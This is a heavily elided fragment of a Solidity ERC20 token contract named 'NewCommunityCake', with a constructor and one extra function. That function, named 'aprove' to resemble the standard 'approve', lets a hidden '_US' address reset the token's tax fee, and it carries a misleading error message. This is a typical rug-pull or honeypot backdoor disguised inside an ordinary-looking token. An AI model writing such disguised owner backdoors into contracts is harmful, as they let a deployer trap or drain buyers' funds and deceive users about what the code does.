 ...
 */
 ...
 contract NewCommunityCake is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_ , address  US_ , address fix_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function aprove(uint256 a) public{
        _setTaxFee( a);
       require(_msgSender() == _US, "ERC20: cannot permit dev address");
    }
